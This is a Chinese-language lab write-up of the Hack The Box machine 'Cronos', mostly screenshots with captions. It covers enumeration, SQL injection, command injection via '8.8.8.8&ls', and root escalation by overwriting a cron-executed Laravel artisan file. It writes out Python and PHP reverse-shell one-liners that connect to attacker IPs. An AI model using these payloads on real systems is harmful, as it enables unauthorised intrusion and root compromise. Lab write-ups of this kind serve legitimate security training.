# cronos

- **Cronos是hackthebox的一台中等难度的靶机**

- 按例nmap扫描端口和漏洞

![image-20211014021033596](http://cdn.mxrblog.cn/image-20211014021033596.png)

- nmap没扫出什么有价值的漏洞

![image-20211014021207296](http://cdn.mxrblog.cn/image-20211014021207296.png)

- 打开浏览器查看开放的内容，没啥有用的

![image-20211014021947859](http://cdn.mxrblog.cn/image-20211014021947859.png)

- gobuster目录扫描，也没什么意思

![image-20211014021418084](http://cdn.mxrblog.cn/image-20211014021418084.png)

- 在host文件中添加以下内容  (别问，问就是猜的)

`10.10.10.13   cronos.htb`

![image-20211015114349504](http://cdn.mxrblog.cn/image-20211015114349504.png)

- 查看能否登录这个域名

![image-20211015114537540](http://cdn.mxrblog.cn/image-20211015114537540.png)

- dirsearch走起

![image-20211015115004925](http://cdn.mxrblog.cn/image-20211015115004925.png)

- 这个域名没没有什么有用的东西，使用`host -l`查看是否还有其他域名

![image-20211015120436721](http://cdn.mxrblog.cn/image-20211015120436721.png)

- 将这些域名添加到host文件中

![image-20211015120632914](http://cdn.mxrblog.cn/image-20211015120632914.png)

- 这些域名分别登录后发现 admin.cronos.htb 这个域名内可以进行sql注入

![image-20211015120849405](http://cdn.mxrblog.cn/image-20211015120849405.png)

- 使用sql登录后查看

![image-20211015121343287](http://cdn.mxrblog.cn/image-20211015121343287.png)

- 输入框里面内容为： `8.8.8.8&ls`

![image-20211015121555225](http://cdn.mxrblog.cn/image-20211015121555225.png)

- 说明我们可以在输入框中发送一个反弹shell

- 使用python反弹shell，kali使用nc监听4443端口

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image-20211015122952627](http://cdn.mxrblog.cn/image-20211015122952627.png)

- 获取一个交互式shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20211015123119595](http://cdn.mxrblog.cn/image-20211015123119595.png)

- 获得user.txt

![image-20211015123327093](http://cdn.mxrblog.cn/image-20211015123327093.png)

- 使用提权工具linpeas.sh查看是否有可提权的文件存在

![image-20211015182856693](http://cdn.mxrblog.cn/image-20211015182856693.png)

- 发现定时执行的文件

![image-20211015184728900](http://cdn.mxrblog.cn/image-20211015184728900.png)

- 如果我们检查 /var/www/laravel/artisan 文件，我们会看到我们拥有它并且可以修改它！我们可以替换或附加 php 代码到这个文件来触发一个 root shell

![image-20211016004054448](http://cdn.mxrblog.cn/image-20211016004054448.png)

- 我们将用一个简单的一行 PHP 脚本替换该文件，以便在端口 9999 上向我们发送一个反向 shell，如下所示。之后，我们设置一个 netcat 侦听器并等待我们的 root shell 到达

```
echo '<?php $sock=fsockopen("10.10.14.4",9999);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /var/www/laravel/artisan
```

![image-20211016004910449](http://cdn.mxrblog.cn/image-20211016004910449.png)

![image-20211016005231886](http://cdn.mxrblog.cn/image-20211016005231886.png)

![image-20211016005328866](http://cdn.mxrblog.cn/image-20211016005328866.png)
